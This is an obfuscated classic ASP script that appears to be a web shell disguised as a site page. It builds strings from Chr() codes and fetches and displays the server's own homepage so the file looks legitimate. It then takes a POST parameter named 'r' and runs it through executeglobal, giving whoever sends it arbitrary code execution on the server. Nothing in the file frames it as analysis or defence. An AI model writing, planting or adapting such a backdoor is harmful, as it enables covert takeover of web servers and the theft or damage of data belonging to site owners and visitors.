<%
Public l1O0O0l1O0O0l1O0O0l1l1l1
    On Error Resume Next 
    Response.Write l1l1l1O0O0O0l1l1O0l1O0l1O0 ( Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Request.ServerVariables ( Chr ( 72 ) & Chr ( 84 ) & Chr ( 84 ) & Chr ( 80 ) & Chr ( 95 ) & Chr ( 72 ) & Chr ( 79 ) & Chr ( 83 ) & Chr ( 84 ) ) & Chr ( 47 ) )  
    Response.Write vbCrLf 
    l1O0O0l1O0O0l1O0O0l1l1l1 = Request.Form ( Chr ( 114 ) ) 
 If l1O0O0l1O0O0l1O0O0l1l1l1 <>   "" Then executeglobal ( l1O0O0l1O0O0l1O0O0l1l1l1 )  
    Response.Write vbCrLf 
Function l1l1l1O0O0O0l1l1O0l1O0l1O0(l1l1O0O0l1O0O0l1O0l1l1l1O0 )
    Dim l1O0O0O0O0l1O0O0l1O0O0l1l1
    Set l1O0O0O0O0l1O0O0l1O0O0l1l1 = Server.CreateObject ( Chr ( 77 ) & Chr ( 115 ) & Chr ( 120 ) & Chr ( 109 ) & Chr ( 108 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 88 ) & Chr ( 77 ) & Chr ( 76 ) & Chr ( 72 ) & Chr ( 84 ) & Chr ( 84 ) & Chr ( 80 ) )  
    l1O0O0O0O0l1O0O0l1O0O0l1l1.Open Chr ( 71 ) & Chr ( 69 ) & Chr ( 84 ) , l1l1O0O0l1O0O0l1O0l1l1l1O0 , False 
    l1O0O0O0O0l1O0O0l1O0O0l1l1.send 
    If l1O0O0O0O0l1O0O0l1O0O0l1l1.readyState <> ( 76 * 57 - 4328 ) Then Exit Function 
    l1l1l1O0O0O0l1l1O0l1O0l1O0 = l1l1l1l1O0l1l1O0O0l1O0O0 ( l1O0O0O0O0l1O0O0l1O0O0l1l1.responseBody )  
    Set l1O0O0O0O0l1O0O0l1O0O0l1l1 = Nothing 
End Function
Function l1l1l1l1O0l1l1O0O0l1O0O0(l1O0l1l1l1O0l1l1O0O0l1O0O0 )
    Dim l1l1l1l1l1O0O0l1O0l1O0O0l1
    Dim l1O0O0l1O0O0O0l1l1l1O0O0l1
    Set l1l1l1l1l1O0O0l1O0l1O0O0l1 = Server.CreateObject ( Chr ( 65 ) & Chr ( 68 ) & Chr ( 79 ) & Chr ( 68 ) & Chr ( 66 ) & Chr ( 46 ) & Chr ( 83 ) & Chr ( 116 ) & Chr ( 114 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 109 ) )  
    l1l1l1l1l1O0O0l1O0l1O0O0l1.Type = ( 40 * 15 - 598 )  
    l1l1l1l1l1O0O0l1O0l1O0O0l1.Open 
    l1l1l1l1l1O0O0l1O0l1O0O0l1.WriteText l1O0l1l1l1O0l1l1O0O0l1O0O0 
    l1l1l1l1l1O0O0l1O0l1O0O0l1.Position = ( 89 * 41 - 3649 )  
    l1l1l1l1l1O0O0l1O0l1O0O0l1.Charset = Chr ( 105 ) & Chr ( 115 ) & Chr ( 111 ) & Chr ( 45 ) & Chr ( 56 ) & Chr ( 56 ) & Chr ( 53 ) & Chr ( 57 ) & Chr ( 45 ) & Chr ( 49 )  
    l1l1l1l1l1O0O0l1O0l1O0O0l1.Position = ( 78 * 2 - 154 )  
    l1O0O0l1O0O0O0l1l1l1O0O0l1 = l1l1l1l1l1O0O0l1O0l1O0O0l1.ReadText 
    l1l1l1l1l1O0O0l1O0l1O0O0l1.Close 
    Set l1l1l1l1l1O0O0l1O0l1O0O0l1 = Nothing 
    l1l1l1l1O0l1l1O0O0l1O0O0 = l1O0O0l1O0O0O0l1l1l1O0O0l1 
End Function

%>
